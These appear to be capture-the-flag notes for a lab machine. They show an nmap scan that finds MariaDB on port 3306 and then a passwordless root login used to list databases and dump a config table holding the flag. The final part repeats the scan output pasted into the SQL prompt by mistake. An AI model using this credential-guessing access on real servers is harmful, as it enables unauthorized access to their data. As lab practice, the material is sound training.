IP = 10.129.21.195 

SQL, MariaDB, weak password related

#Nmap scan report
------------------------------------------
Nmap scan report for 10.129.21.195
Host is up (0.061s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 151
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, ConnectWithDatabase, FoundRows, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, InteractiveClient, LongColumnFlag, SupportsCompression, ODBCClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: j1R+{P[X'Ym7h'(2atD4
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.02 seconds


#Accessing mySQL port
------------------------------------------
$ mysql -h 10.129.21.195 -u root

MariaDB [(none)]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.064 sec)


MariaDB [(none)]> USE htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> SHOW tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.061 sec)

MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | FLAG_FOUND                       |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.062 sec)

MariaDB [htb]> map scan report for 10.129.21.195
    -> Host is up (0.061s latency).
    -> Not shown: 999 closed tcp ports (conn-refused)
    -> PORT     STATE SERVICE VERSION
    -> 3306/tcp open  mysql?
    -> |_sslv2: ERROR: Script execution failed (use -d to debug)
    -> | mysql-info: 
    -> |   Protocol: 10
    -> |   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
    -> |   Thread ID: 151
    -> |   Capabilities flags: 63486
    -> |   Some Capabilities: Support41Auth, ConnectWithDatabase, FoundRows, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, InteractiveClient, LongColumnFlag, SupportsCompression, ODBCClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
    -> |   Status: Autocommit
    -> |   Salt: j1R+{P[X'Ym7h'(2atD4
    -> |_  Auth Plugin Name: mysql_native_password

